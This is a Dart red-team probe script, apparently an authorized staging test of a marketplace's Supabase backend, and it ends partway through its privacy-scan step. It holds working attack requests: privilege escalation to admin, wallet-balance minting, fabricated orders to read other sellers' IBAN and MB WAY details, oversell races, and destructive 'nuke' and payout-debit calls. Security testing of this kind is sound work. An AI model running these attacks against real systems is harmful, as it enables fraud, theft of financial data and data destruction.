/// Red Team Cego B — probe independente (staging only).
/// service_role = setup / observação / cleanup. Exploits = anon / buyer / seller JWT.
/// NÃO corrige. NÃO toca produção.
import 'dart:convert';
import 'dart:io';
import 'dart:math';

const stagingRef = 'fxdknzrqjenzqcvnwqqq';
const base = 'https://fxdknzrqjenzqcvnwqqq.supabase.co';
const frozenAt = '2026-08-29T10:12:00+01:00';

late String anon;
late String svc;
late String buyerEmail;
late String buyerPass;
late String sellerEmail;
late String sellerPass;
late String buyerJwt;
late String sellerJwt;
late String buyerId;
late String sellerId;

final findings = <Map<String, dynamic>>[];
final mapNotes = <String, dynamic>{};
final cycles = <Map<String, dynamic>>[];
final evidence = <Map<String, dynamic>>[];

void recFinding({
  required String id,
  required String title,
  required String severity,
  required String actor,
  required String impact,
  required Map<String, dynamic> proof,
}) {
  findings.add({
    'id': id,
    'title': title,
    'severity': severity,
    'actor': actor,
    'impact': impact,
    'proof': proof,
  });
}

Map<String, String> hdr(String token) => {
      'apikey': token == svc ? svc : anon,
      'Authorization': 'Bearer $token',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Future<HttpClientResponse> req(
  String method,
  String url, {
  String? token,
  Object? body,
  Map<String, String>? extra,
}) async {
  final client = HttpClient();
  final r = await client.openUrl(method, Uri.parse(url));
  final h = hdr(token ?? anon);
  h.addAll(extra ?? {});
  h.forEach(r.headers.set);
  if (body != null) {
    r.write(body is String ? body : jsonEncode(body));
  }
  final res = await r.close();
  return res;
}

Future<String> readBody(HttpClientResponse res) async {
  return await res.transform(utf8.decoder).join();
}

Future<Map<String, dynamic>> jsonMap(HttpClientResponse res) async {
  final t = await readBody(res);
  if (t.isEmpty) return {'_status': res.statusCode, '_empty': true};
  final d = jsonDecode(t);
  if (d is Map<String, dynamic>) {
    return {'_status': res.statusCode, ...d};
  }
  return {'_status': res.statusCode, '_raw': d};
}

Future<dynamic> jsonAny(HttpClientResponse res) async {
  final t = await readBody(res);
  if (t.isEmpty) return {'_status': res.statusCode, '_empty': true};
  return {'_status': res.statusCode, '_body': jsonDecode(t), '_text': t};
}

Future<String> signIn(String email, String password) async {
  final res = await req(
    'POST',
    '$base/auth/v1/token?grant_type=password',
    token: anon,
    body: {'email': email, 'password': password},
  );
  final m = await jsonMap(res);
  final tok = (m['access_token'] ?? '').toString();
  if (tok.isEmpty) {
    throw StateError('signIn $email failed ${m['_status']} $m');
  }
  return tok;
}

Future<String> uidOf(String jwt) async {
  final res = await req('GET', '$base/auth/v1/user', token: jwt);
  final m = await jsonMap(res);
  return (m['id'] ?? '').toString();
}

Future<Map<String, dynamic>> rest(
  String method,
  String path, {
  required String token,
  Object? body,
  String? prefer,
}) async {
  final extra = <String, String>{};
  if (prefer != null) extra['Prefer'] = prefer;
  final res = await req(method, '$base/rest/v1/$path',
      token: token, body: body, extra: extra);
  return await jsonAny(res) as Map<String, dynamic>;
}

Future<Map<String, dynamic>> rpc(
  String name,
  Map<String, dynamic> args, {
  required String token,
}) async {
  final res = await req(
    'POST',
    '$base/rest/v1/rpc/$name',
    token: token,
    body: args,
  );
  final t = await readBody(res);
  dynamic parsed;
  try {
    parsed = t.isEmpty ? null : jsonDecode(t);
  } catch (_) {
    parsed = t;
  }
  return {'_status': res.statusCode, '_body': parsed, '_text': t};
}

Future<Map<String, dynamic>> edge(
  String name, {
  required String token,
  Object? body,
  String method = 'POST',
  Map<String, String>? extra,
  String qs = '',
}) async {
  final res = await req(
    method,
    '$base/functions/v1/$name$qs',
    token: token,
    body: body,
    extra: extra,
  );
  final t = await readBody(res);
  dynamic parsed;
  try {
    parsed = t.isEmpty ? null : jsonDecode(t);
  } catch (_) {
    parsed = t;
  }
  return {'_status': res.statusCode, '_body': parsed, '_text': t};
}

String stamp() => DateTime.now().millisecondsSinceEpoch.toString();

Future<Map<String, String>> loadEnv() async {
  final f = File('tool/live_ops_staging.env');
  final map = <String, String>{};
  for (final line in await f.readAsLines()) {
    final t = line.trim();
    if (t.isEmpty || t.startsWith('#')) continue;
    final i = t.indexOf('=');
    if (i <= 0) continue;
    map[t.substring(0, i).trim()] = t.substring(i + 1).trim();
  }
  return map;
}

Future<void> cycle(String name, Future<void> Function() fn) async {
  stdout.writeln('\n===== CICLO: $name =====');
  final started = DateTime.now();
  try {
    await fn();
    cycles.add({
      'name': name,
      'ok': true,
      'ms': DateTime.now().difference(started).inMilliseconds,
    });
  } catch (e, st) {
    stderr.writeln('ciclo $name erro: $e');
    cycles.add({
      'name': name,
      'ok': false,
      'error': e.toString(),
      'stack': st.toString(),
    });
  }
}

Future<void> main() async {
  final env = await loadEnv();
  anon = env['SUPABASE_ANON_KEY']!;
  svc = env['SUPABASE_SERVICE_ROLE_KEY']!;
  buyerEmail = env['LIVE_OPS_TEST_BUYER_EMAIL']!;
  buyerPass = env['LIVE_OPS_TEST_BUYER_PASSWORD']!;
  sellerEmail = env['LIVE_OPS_TEST_SELLER_EMAIL']!;
  sellerPass = env['LIVE_OPS_TEST_SELLER_PASSWORD']!;

  if (!base.contains(stagingRef)) {
    throw StateError('staging mismatch');
  }

  buyerJwt = await signIn(buyerEmail, buyerPass);
  sellerJwt = await signIn(sellerEmail, sellerPass);
  buyerId = await uidOf(buyerJwt);
  sellerId = await uidOf(sellerJwt);
  stdout.writeln('buyer=$buyerId seller=$sellerId');

  await cycle('1 recon', cycleRecon);
  await cycle('2 identidade+pii', cycleIdentity);
  await cycle('3 composicao financeira PII', cycleBankingOracle);
  await cycle('4 stock+estados', cycleStockStates);
  await cycle('5 races', cycleRaces);
  await cycle('6 edge+rpc grants', cycleEdgeRpc);
  await cycle('7 privacidade residual', cyclePrivacy);
  await cycle('8 collusion+reputacao', cycleCollusion);
  await cycle('9 saturação extra', cycleSaturation);

  await writeDeliverables();
}

Future<void> cycleRecon() async {
  final openapi = await req(
    'GET',
    '$base/rest/v1/',
    token: anon,
    extra: {'Accept': 'application/openapi+json'},
  );
  final specText = await readBody(openapi);
  Map<String, dynamic> spec = {};
  try {
    spec = jsonDecode(specText) as Map<String, dynamic>;
  } catch (_) {}
  final paths = (spec['paths'] as Map?)?.keys.map((e) => e.toString()).toList() ??
      [];
  final tables = paths.where((p) => !p.contains('/rpc/')).toList();
  final rpcs = paths
      .where((p) => p.contains('/rpc/'))
      .map((p) => p.split('/').last)
      .toList();
  mapNotes['openapi_status'] = openapi.statusCode;
  mapNotes['tables'] = tables;
  mapNotes['rpc_count'] = rpcs.length;
  mapNotes['rpcs_sample'] = rpcs.take(80).toList();
  mapNotes['edge_functions'] = [
    'create-payment-intent',
    'create-live-tip-checkout',
    'refund-order',
    'create-connect-account',
    'create-mux-live',
    'complete-mux-live',
    'livekit-mux-publish',
    'stripe-webhook',
    'delete-test-account',
    'ingest-ocr-reservation',
    'ps-pairing-claim',
    'ps-heartbeat',
    'ps-panel-log',
    'send-sms-bulkgate',
    'meta-data-deletion',
    'resolve-mux-playback',
    'sec-fase2-e2e-oversell',
  ];
  evidence.add({
    'kind': 'recon',
    'openapi_status': openapi.statusCode,
    'table_count': tables.length,
    'rpc_count': rpcs.length,
  });

  // GRANT leak sample — wallet primitives + payout + raffle + email oracle
  final grantTargets = [
    'batata_credit_wallet_once',
    'batata_debit_wallet_once',
    'batata_ensure_wallet',
    'batata_wallet_payout_debit',
    'batata_create_raffle_prize_order',
    'batata_draw_live_raffle_winners',
    'batata_find_user_id_by_email',
    'batata_seller_direct_payment_details',
    'batata_generate_auto_feedback',
    'staging_nuke_user_data',
    'batata_lab_clear_all_fm_pending',
    'batata_process_partial_refund_dispute',
    'batata_finalize_stripe_order_refund',
    'batata_settle_live_tip_from_stripe',
    'batata_create_live_tip_pending',
  ];
  final grantHits = <String, dynamic>{};
  for (final n in grantTargets) {
    final r = await rpc(n, {}, token: buyerJwt);
    grantHits[n] = {
      'status': r['_status'],
      'snippet': (r['_text'] ?? '').toString().substring(
            0,
            min(180, (r['_text'] ?? '').toString().length),
          ),
    };
  }
  mapNotes['rpc_probe'] = grantHits;
}

Future<void> cycleIdentity() async {
  // Email → UUID oracle
  final emailHit = await rpc(
    'batata_find_user_id_by_email',
    {'p_email': sellerEmail},
    token: buyerJwt,
  );
  evidence.add({'kind': 'email_oracle', 'result': emailHit});
  final foundId = (emailHit['_body'] ?? '').toString();
  if (emailHit['_status'] == 200 && foundId == sellerId) {
    recFinding(
      id: 'RTB-P2-EMAIL-ORACLE',
      title: 'RPC batata_find_user_id_by_email resolve email → UUID',
      severity: 'P2',
      actor: 'buyer JWT',
      impact:
          'Enumeração de contas por email. Combina com outras RPCs que aceitam UUID.',
      proof: {
        'rpc': 'batata_find_user_id_by_email',
        'status': emailHit['_status'],
        'returned_seller_id': foundId == sellerId,
      },
    );
  }

  // user_type admin
  final adminPatch = await rest(
    'PATCH',
    'profiles?id=eq.$buyerId',
    token: buyerJwt,
    body: {'user_type': 'admin'},
  );
  final afterType = await rest(
    'GET',
    'profiles?id=eq.$buyerId&select=user_type',
    token: buyerJwt,
  );
  evidence.add({
    'kind': 'user_type_admin',
    'patch': adminPatch['_status'],
    'after': afterType['_body'],
  });

  // lives stream key
  final livesBuyer = await rest(
    'GET',
    'lives?select=id,mux_stream_key,stream_key,mux_live_id&limit=3',
    token: buyerJwt,
  );
  evidence.add({
    'kind': 'lives_stream_key_buyer',
    'status': livesBuyer['_status'],
    'text': (livesBuyer['_text'] ?? '').toString().substring(
          0,
          min(400, (livesBuyer['_text'] ?? '').toString().length),
        ),
  });
  final lkText = (livesBuyer['_text'] ?? '').toString();
  if (livesBuyer['_status'] == 200 &&
      (lkText.contains('mux_stream_key') ||
          RegExp(r'"stream_key"\s*:\s*"[^"]+"').hasMatch(lkText))) {
    recFinding(
      id: 'RTB-P1-STREAM-KEY',
      title: 'Stream key Mux visível via PostgREST',
      severity: 'P1',
      actor: 'buyer JWT',
      impact: 'Hijack de ingest RTMP de directo alheio.',
      proof: {'select': 'lives.mux_stream_key', 'status': livesBuyer['_status']},
    );
  }

  // helper self-insert on victim store
  final helperIns = await rest(
    'POST',
    'seller_helpers',
    token: buyerJwt,
    body: {
      'seller_id': sellerId,
      'helper_user_id': buyerId,
      'invited_by': buyerId,
      'display_name': 'rtb',
      'invitation_status': 'accepted',
      'active': true,
      'permissions': {
        'can_manage_reservations': true,
        'can_mark_items_sold': true,
      },
    },
  );
  evidence.add({'kind': 'helper_self_insert', 'status': helperIns['_status']});
}

Future<void> cycleBankingOracle() async {
  // Setup: vítima descartável com IBAN + flag external payments
  final tag = stamp();
  final victimEmail = 'rtb-b-$tag@fleaber.invalid';
  final victimPass = 'RtbB_${tag}xX1!';
  final createUser = await req(
    'POST',
    '$base/auth/v1/admin/users',
    token: svc,
    body: {
      'email': victimEmail,
      'password': victimPass,
      'email_confirm': true,
    },
  );
  final created = await jsonMap(createUser);
  final victimId = (created['id'] ?? '').toString();
  if (victimId.isEmpty) {
    evidence.add({'kind': 'victim_create_failed', 'body': created});
    // Fallback: atacar o seller de teste (relação pode já existir)
    await _probeBanking(sellerId, 'existing_seller', createRelation: true);
    return;
  }

  await rest('POST', 'profiles', token: svc, body: {
    'id': victimId,
    'full_name': 'RTB Victim $tag',
    'user_type': 'vendedor',
    'iban': 'PT50000201231234567890154',
    'mb_way': '911000000',
    'external_payments_enabled': true,
  });
  // profiles may already exist via trigger
  await rest(
    'PATCH',
    'profiles?id=eq.$victimId',
    token: svc,
    body: {
      'iban': 'PT50000201231234567890154',
      'mb_way': '911000000',
      'external_payments_enabled': true,
      'user_type': 'vendedor',
    },
  );

  final prod = await rest('POST', 'products', token: svc, body: {
    'seller_id': victimId,
    'title': 'RTB victim sku $tag',
    'price': 12.0,
    'quantity': 1,
    'ref_code': 'RTB-$tag',
    'list_on_marketplace': true,
    'is_sold': false,
  });
  evidence.add({
    'kind': 'victim_setup',
    'victim_id': victimId,
    'product_status': prod['_status'],
  });

  await _probeBanking(victimId, 'fresh_victim',
      createRelation: true, victimProduct: prod);

  // Cleanup victim (best-effort)
  await req('DELETE', '$base/auth/v1/admin/users/$victimId', token: svc);
}

Future<void> _probeBanking(
  String targetSellerId,
  String label, {
  required bool createRelation,
  Map<String, dynamic>? victimProduct,
}) async {
  // BEFORE: RPC without new relation (may still hit historical orders)
  final before = await rpc(
    'batata_seller_direct_payment_details',
    {'p_seller_id': targetSellerId},
    token: buyerJwt,
  );

  Map<String, dynamic>? bundleIns;
  Map<String, dynamic>? orderIns;
  if (createRelation) {
    bundleIns = await rest('POST', 'product_bundles', token: buyerJwt, body: {
      'seller_id': targetSellerId,
      'buyer_id': buyerId,
      'product_ids': ['00000000-0000-0000-0000-000000000001'],
      'subtotal_eur': 1,
      'discount_pct': 0,
      'discount_eur': 0,
      'total_eur': 1,
      'status': 'pending',
    });
    orderIns = await rest('POST', 'orders', token: buyerJwt, body: {
      'buyer_id': buyerId,
      'seller_id': targetSellerId,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
      'price_total': 1,
      'quantity': 1,
    });
  }

  final afterBundle = await rpc(
    'batata_seller_direct_payment_details',
    {'p_seller_id': targetSellerId},
    token: buyerJwt,
  );

  evidence.add({
    'kind': 'banking_oracle_$label',
    'before': before,
    'bundle_insert': {
      'status': bundleIns?['_status'],
      'text': (bundleIns?['_text'] ?? '').toString().substring(
            0,
            min(300, (bundleIns?['_text'] ?? '').toString().length),
          ),
    },
    'order_insert': {
      'status': orderIns?['_status'],
      'text': (orderIns?['_text'] ?? '').toString().substring(
            0,
            min(300, (orderIns?['_text'] ?? '').toString().length),
          ),
    },
    'after': afterBundle,
  });

  bool leaked(dynamic body) {
    if (body == null) return false;
    final s = jsonEncode(body);
    return s.contains('PT50') ||
        s.contains('911000000') ||
        (s.contains('iban') &&
            s.contains('mb_way') &&
            !s.contains('[]') &&
            s.contains('"iban":"'));
  }

  final got = leaked(afterBundle['_body']) ||
      (afterBundle['_body'] is List &&
          (afterBundle['_body'] as List).isNotEmpty &&
          jsonEncode(afterBundle['_body']).contains('iban'));

  if (afterBundle['_status'] == 200 && got) {
    recFinding(
      id: 'RTB-P1-BANKING-ORACLE',
      title:
          'Comprador fabrica relação (bundle/order) e lê IBAN/MB WAY de vendedor alheio',
      severity: 'P1',
      actor: 'buyer JWT',
      impact:
          'PII financeira (IBAN/MB WAY) de qualquer vendedor com pagamentos externos, sem pagamento nem aceite do vendedor.',
      proof: {
        'label': label,
        'rpc': 'batata_seller_direct_payment_details',
        'bundle_insert_status': bundleIns?['_status'],
        'order_insert_status': orderIns?['_status'],
        'rpc_status': afterBundle['_status'],
        'body_has_iban': true,
      },
    );
  } else if (afterBundle['_status'] == 200) {
    // empty return = fail closed for this target
    evidence.add({
      'kind': 'banking_oracle_no_leak_$label',
      'after_body': afterBundle['_body'],
    });
  }
}

Future<void> cycleStockStates() async {
  final tag = stamp();
  // Seller product stock=1
  final p = await rest('POST', 'products', token: sellerJwt, body: {
    'seller_id': sellerId,
    'title': 'RTB stock1 $tag',
    'price': 8.0,
    'quantity': 1,
    'ref_code': 'RTB-S1-$tag',
    'list_on_marketplace': true,
    'is_sold': false,
  });
  final prodList = p['_body'];
  String? pid;
  if (prodList is List && prodList.isNotEmpty) {
    pid = (prodList.first as Map)['id']?.toString();
  }
  evidence.add({'kind': 'stock_product', 'status': p['_status'], 'id': pid});
  if (pid == null) return;

  // Two unpaid orders on same SKU
  final o1 = await rest('POST', 'orders', token: buyerJwt, body: {
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'product_id': pid,
    'status': 'reserva_pendente',
    'payment_method': 'MB WAY',
    'price_total': 8,
    'quantity': 1,
  });
  final o2 = await rest('POST', 'orders', token: sellerJwt, body: {
    'buyer_id': sellerId,
    'seller_id': sellerId,
    'product_id': pid,
    'status': 'reserva_pendente',
    'payment_method': 'MB WAY',
    'price_total': 8,
    'quantity': 1,
  });
  String? id1;
  String? id2;
  if (o1['_body'] is List && (o1['_body'] as List).isNotEmpty) {
    id1 = ((o1['_body'] as List).first as Map)['id']?.toString();
  }
  if (o2['_body'] is List && (o2['_body'] as List).isNotEmpty) {
    id2 = ((o2['_body'] as List).first as Map)['id']?.toString();
  }

  // Seller marks both pago (off-platform)
  Map<String, dynamic>? p1;
  Map<String, dynamic>? p2;
  if (id1 != null) {
    p1 = await rest('PATCH', 'orders?id=eq.$id1', token: sellerJwt, body: {
      'status': 'pago',
    });
  }
  if (id2 != null) {
    p2 = await rest('PATCH', 'orders?id=eq.$id2', token: sellerJwt, body: {
      'status': 'pago',
    });
  }

  final afterProd = await rest(
    'GET',
    'products?id=eq.$pid&select=id,quantity,is_sold,list_on_marketplace',
    token: svc,
  );
  final oAfter = await rest(
    'GET',
    'orders?id=in.($id1,$id2)&select=id,status,stock_units_applied,amount_paid_cents,buyer_id',
    token: svc,
  );

  evidence.add({
    'kind': 'mbway_double_pago',
    'o1': o1['_status'],
    'o2': o2['_status'],
    'id1': id1,
    'id2': id2,
    'patch1': p1?['_status'],
    'patch1_text': (p1?['_text'] ?? '').toString().substring(
          0,
          min(250, (p1?['_text'] ?? '').toString().length),
        ),
    'patch2': p2?['_status'],
    'patch2_text': (p2?['_text'] ?? '').toString().substring(
          0,
          min(250, (p2?['_text'] ?? '').toString().length),
        ),
    'product_after': afterProd['_body'],
    'orders_after': oAfter['_body'],
  });

  int paidCount = 0;
  if (oAfter['_body'] is List) {
    for (final row in oAfter['_body'] as List) {
      if ((row as Map)['status']?.toString().toLowerCase() == 'pago') {
        paidCount++;
      }
    }
  }
  if (paidCount >= 2) {
    recFinding(
      id: 'RTB-P0-OVERSELL-MBWAY',
      title: 'Duas orders MB WAY em pago permanente com stock=1',
      severity: 'P0',
      actor: 'seller JWT (duas orders)',
      impact: 'Oversell válido: duas vendas off-platform sobre 1 unidade.',
      proof: {
        'product_id': pid,
        'paid_count': paidCount,
        'product_after': afterProd['_body'],
        'orders_after': oAfter['_body'],
      },
    );
  }

  // premio_rifa → buyer marks pago (stock skip)
  final pRaffle = await rest('POST', 'products', token: sellerJwt, body: {
    'seller_id': sellerId,
    'title': 'RTB premio $tag',
    'price': 9.0,
    'quantity': 1,
    'ref_code': 'RTB-PR-$tag',
    'list_on_marketplace': true,
    'is_sold': false,
  });
  String? pidR;
  if (pRaffle['_body'] is List && (pRaffle['_body'] as List).isNotEmpty) {
    pidR = ((pRaffle['_body'] as List).first as Map)['id']?.toString();
  }
  if (pidR != null) {
    final oR = await rest('POST', 'orders', token: sellerJwt, body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pidR,
      'status': 'premio_rifa',
      'payment_method': 'MB WAY',
      'price_total': 0,
      'quantity': 1,
    });
    String? oidR;
    if (oR['_body'] is List && (oR['_body'] as List).isNotEmpty) {
      oidR = ((oR['_body'] as List).first as Map)['id']?.toString();
    }
    Map<String, dynamic>? buyerPago;
    if (oidR != null) {
      buyerPago =
          await rest('PATCH', 'orders?id=eq.$oidR', token: buyerJwt, body: {
        'status': 'pago',
      });
    }
    final oRafter = oidR == null
        ? null
        : await rest(
            'GET',
            'orders?id=eq.$oidR&select=id,status,stock_units_applied,amount_paid_cents',
            token: svc,
          );
    final prodR = await rest(
      'GET',
      'products?id=eq.$pidR&select=quantity,is_sold',
      token: svc,
    );
    evidence.add({
      'kind': 'premio_rifa_buyer_pago',
      'insert_status': oR['_status'],
      'insert_text': (oR['_text'] ?? '').toString().substring(
            0,
            min(250, (oR['_text'] ?? '').toString().length),
          ),
      'buyer_patch': buyerPago?['_status'],
      'buyer_text': (buyerPago?['_text'] ?? '').toString().substring(
            0,
            min(250, (buyerPago?['_text'] ?? '').toString().length),
          ),
      'order_after': oRafter?['_body'],
      'product_after': prodR['_body'],
    });
    if (oRafter?['_body'] is List &&
        (oRafter!['_body'] as List).isNotEmpty) {
      final st =
          ((oRafter['_body'] as List).first as Map)['status']?.toString();
      final stockApplied =
          ((oRafter['_body'] as List).first as Map)['stock_units_applied'];
      if (st == 'pago' && (stockApplied == null)) {
        recFinding(
          id: 'RTB-P2-PREMIO-RIFA-PAGO',
          title:
              'Buyer marca premio_rifa→pago sem captura nem consumo de stock',
          severity: 'P2',
          actor: 'seller INSERT premio_rifa + buyer PATCH pago',
          impact:
              'Estado pago sem dinheiro nem stock. Reputação/logística podem seguir se outros guards falharem.',
          proof: {
            'order': oRafter['_body'],
            'product': prodR['_body'],
          },
        );
      }
    }
  }

  // Foreign product: buyer uses seller product (already). Victim product:
  final foreign = await rest(
    'GET',
    'products?seller_id=neq.$sellerId&seller_id=neq.$buyerId&select=id,seller_id,quantity&limit=1',
    token: svc,
  );
  if (foreign['_body'] is List && (foreign['_body'] as List).isNotEmpty) {
    final fp = (foreign['_body'] as List).first as Map;
    final steal = await rest('POST', 'orders', token: buyerJwt, body: {
      'buyer_id': buyerId,
      'seller_id': buyerId,
      'product_id': fp['id'],
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
      'price_total': 1,
      'quantity': 1,
    });
    evidence.add({
      'kind': 'foreign_product_order',
      'status': steal['_status'],
      'text': (steal['_text'] ?? '').toString().substring(
            0,
            min(250, (steal['_text'] ?? '').toString().length),
          ),
    });
  }

  // Wallet mint via INSERT/UPDATE
  final wIns = await rest('POST', 'wallets', token: buyerJwt, body: {
    'id': buyerId,
    'balance': 9999,
  });
  final wUpd = await rest(
    'PATCH',
    'wallets?id=eq.$buyerId',
    token: buyerJwt,
    body: {'balance': 9999},
  );
  final wAfter = await rest(
    'GET',
    'wallets?id=eq.$buyerId&select=id,balance',
    token: buyerJwt,
  );
  evidence.add({
    'kind': 'wallet_jwt_mutate',
    'insert': wIns['_status'],
    'update': wUpd['_status'],
    'after': wAfter['_body'],
  });
  if (wAfter['_body'] is List && (wAfter['_body'] as List).isNotEmpty) {
    final bal = num.tryParse(
          ((wAfter['_body'] as List).first as Map)['balance']?.toString() ??
              '',
        ) ??
        0;
    if (bal >= 9999) {
      recFinding(
        id: 'RTB-P0-WALLET-MINT',
        title: 'JWT escreve saldo de carteira',
        severity: 'P0',
        actor: 'buyer JWT',
        impact: 'Criação líquida de dinheiro levantável.',
        proof: {'balance': bal, 'insert': wIns['_status'], 'update': wUpd['_status']},
      );
    }
  }

  // credit wallet RPC
  final credit = await rpc(
    'batata_credit_wallet_once',
    {
      'p_wallet_id': buyerId,
      'p_order_id': id1,
      'p_amount': 50,
      'p_type': 'reembolso',
      'p_description': 'rtb',
    },
    token: buyerJwt,
  );
  evidence.add({'kind': 'credit_wallet_rpc', 'result': credit});
}

Future<void> cycleRaces() async {
  final tag = stamp();
  final p = await rest('POST', 'products', token: sellerJwt, body: {
    'seller_id': sellerId,
    'title': 'RTB race $tag',
    'price': 5.0,
    'quantity': 1,
    'ref_code': 'RTB-R-$tag',
    'list_on_marketplace': true,
    'is_sold': false,
  });
  String? pid;
  if (p['_body'] is List && (p['_body'] as List).isNotEmpty) {
    pid = ((p['_body'] as List).first as Map)['id']?.toString();
  }
  if (pid == null) return;

  final orders = <String>[];
  for (var i = 0; i < 4; i++) {
    final buyer = i.isEven ? buyerJwt : sellerJwt;
    final bid = i.isEven ? buyerId : sellerId;
    final o = await rest('POST', 'orders', token: buyer, body: {
      'buyer_id': bid,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'reserva_pendente',
      'payment_method': 'MB WAY',
      'price_total': 5,
      'quantity': 1,
    });
    if (o['_body'] is List && (o['_body'] as List).isNotEmpty) {
      orders.add(((o['_body'] as List).first as Map)['id'].toString());
    }
  }

  final futures = <Future<Map<String, dynamic>>>[];
  for (final oid in orders) {
    futures.add(rest('PATCH', 'orders?id=eq.$oid', token: sellerJwt, body: {
      'status': 'pago',
    }));
  }
  final results = await Future.wait(futures);
  final after = await rest(
    'GET',
    'orders?id=in.(${orders.join(',')})&select=id,status,stock_units_applied',
    token: svc,
  );
  final prod = await rest(
    'GET',
    'products?id=eq.$pid&select=quantity,is_sold',
    token: svc,
  );
  evidence.add({
    'kind': 'race_mbway_pago',
    'n_orders': orders.length,
    'patch_statuses': results.map((e) => e['_status']).toList(),
    'orders_after': after['_body'],
    'product_after': prod['_body'],
  });
  int paid = 0;
  if (after['_body'] is List) {
    for (final row in after['_body'] as List) {
      if ((row as Map)['status']?.toString() == 'pago') paid++;
    }
  }
  if (paid >= 2) {
    recFinding(
      id: 'RTB-P0-RACE-MBWAY',
      title: 'Race: múltiplos PATCH pago MB WAY em stock=1',
      severity: 'P0',
      actor: 'seller JWT burst',
      impact: 'Oversell por corrida entre transições off-platform.',
      proof: {
        'paid': paid,
        'product': prod['_body'],
        'orders': after['_body'],
      },
    );
  }
}

Future<void> cycleEdgeRpc() async {
  // refund as buyer
  final refundBuyer = await edge('refund-order', token: buyerJwt, body: {
    'order_id': '00000000-0000-0000-0000-000000000001',
  });
  // complete mux as buyer on random
  final muxEnd = await edge('complete-mux-live', token: buyerJwt, body: {
    'live_id': '00000000-0000-0000-0000-000000000001',
  });
  final muxCreate = await edge('create-mux-live', token: buyerJwt, body: {
    'title': 'RTB hijack live xx',
  });
  final livekit = await edge('livekit-mux-publish', token: buyerJwt, body: {
    'step': 'token',
    'live_id': '00000000-0000-0000-0000-000000000001',
  });
  final connect = await edge('create-connect-account', token: buyerJwt, body: {
    'user_id': sellerId,
    'amount': 100,
    'idempotency_key': 'rtb-blind-b-${stamp()}xx',
  });
  final tip = await edge('create-live-tip-checkout', token: buyerJwt, body: {
    'seller_id': sellerId,
    'amount_eur': 1,
    'tip_id': '00000000-0000-0000-0000-000000000001',
  });
  final checkout = await edge('create-payment-intent', token: buyerJwt, body: {
    'buyer_id': buyerId,
    'order_id': '00000000-0000-0000-0000-000000000001',
    'amount': 50,
    'shipping_method': 'mao',
  });
  final webhook = await edge('stripe-webhook', token: anon, body: {
    'type': 'checkout.session.completed',
  });
  final nuke = await edge('delete-test-account', token: buyerJwt, body: {
    'confirm': 'APAGAR TUDO',
  });
  final ingest = await edge('ingest-ocr-reservation', token: anon, body: {
    'live_id': '00000000-0000-0000-0000-000000000001',
    'ocr_line_hash': 'abcdefgh',
    'detected_at': DateTime.now().toUtc().toIso8601String(),
  });
  final pair = await edge('ps-pairing-claim', token: anon, body: {
    'code': '000000',
    'device_id': 'rtb',
  });
  final meta = await edge('meta-data-deletion', token: anon, method: 'GET');
  final sms = await edge('send-sms-bulkgate', token: anon, body: {
    'phone': '+351910000000',
    'otp': '000000',
  });
  final e2e = await edge('sec-fase2-e2e-oversell', token: anon, body: {
    'buyer_id': buyerId,
    'seller_id': sellerId,
  });
  final payoutDebit = await rpc(
    'batata_wallet_payout_debit',
    {
      'p_user_id': sellerId,
      'p_amount_cents': 100,
      'p_idempotency_key': 'rtb-debit-${stamp()}',
    },
    token: buyerJwt,
  );
  final rafflePrize = await rpc(
    'batata_create_raffle_prize_order',
    {
      'p_raffle_id': '00000000-0000-0000-0000-000000000001',
      'p_winner_id': buyerId,
      'p_rank': 1,
    },
    token: buyerJwt,
  );
  final autoFb = await rpc('batata_generate_auto_feedback', {}, token: buyerJwt);
  final nukeRpc = await rpc(
    'staging_nuke_user_data',
    {'p_user_id': sellerId},
    token: buyerJwt,
  );
  final partial = await rpc(
    'batata_process_partial_refund_dispute',
    {'p_order_id': '00000000-0000-0000-0000-000000000001', 'p_percent': 100},
    token: buyerJwt,
  );

  evidence.add({
    'kind': 'edge_rpc',
    'refund_buyer': refundBuyer['_status'],
    'mux_end': muxEnd['_status'],
    'mux_create_buyer': {
      'status': muxCreate['_status'],
      'text': (muxCreate['_text'] ?? '').toString().substring(
            0,
            min(200, (muxCreate['_text'] ?? '').toString().length),
          ),
    },
    'livekit': livekit['_status'],
    'connect_confused': {
      'status': connect['_status'],
      'text': (connect['_text'] ?? '').toString().substring(
            0,
            min(220, (connect['_text'] ?? '').toString().length),
          ),
    },
    'tip_client_id': {
      'status': tip['_status'],
      'text': (tip['_text'] ?? '').toString().substring(
            0,
            min(220, (tip['_text'] ?? '').toString().length),
          ),
    },
    'checkout_fake_order': checkout['_status'],
    'webhook': webhook['_status'],
    'nuke': nuke['_status'],
    'ingest': ingest['_status'],
    'pair': pair['_status'],
    'meta_get': meta['_status'],
    'sms': sms['_status'],
    'e2e': e2e['_status'],
    'payout_debit': payoutDebit['_status'],
    'raffle_prize': rafflePrize['_status'],
    'auto_feedback': autoFb['_status'],
    'nuke_rpc': nukeRpc['_status'],
    'partial_refund': partial['_status'],
  });

  if (muxCreate['_status'] == 200) {
    recFinding(
      id: 'RTB-P1-MUX-BUYER',
      title: 'Comprador cria stream Mux (custo/autoridade)',
      severity: 'P1',
      actor: 'buyer JWT',
      impact: 'Escalada a publisher de directo / custo Mux.',
      proof: muxCreate,
    );
  }
  if (e2e['_status'] == 200) {
    recFinding(
      id: 'RTB-P0-E2E-ANON',
      title: 'sec-fase2-e2e-oversell acessível sem service_role',
      severity: 'P0',
      actor: 'anon',
      impact: 'Harness de settle Stripe invocável por actor não privilegiado.',
      proof: {'status': e2e['_status']},
    );
  }
  if (payoutDebit['_status'] == 200) {
    recFinding(
      id: 'RTB-P0-PAYOUT-DEBIT',
      title: 'JWT executa batata_wallet_payout_debit sobre outra carteira',
      severity: 'P0',
      actor: 'buyer JWT',
      impact: 'Confused deputy: débito de saldo alheio.',
      proof: payoutDebit,
    );
  }
}

Future<void> cyclePrivacy() async {
  final tables = [
    'orders',
    'chats',
    'chat_messages',
    'order_disputes',
    'profiles',
    'wallets',
    'wallet_transactions',
    'stripe_checkout_events',
    'ps_ingest_audit',
    'app_logs',
    'live_tips',
    'live_raffle_winners',
    'live_reservation_requests',
    'reviews',
  ];
  final scan = <String, dynamic>{};
  for (final t in tables) {
    final r = await rest(
      'GET',
      '$t?select=*&limit=5',
      token: buyerJwt,
    );
    scan[t] = {
      'status': r['_status'],
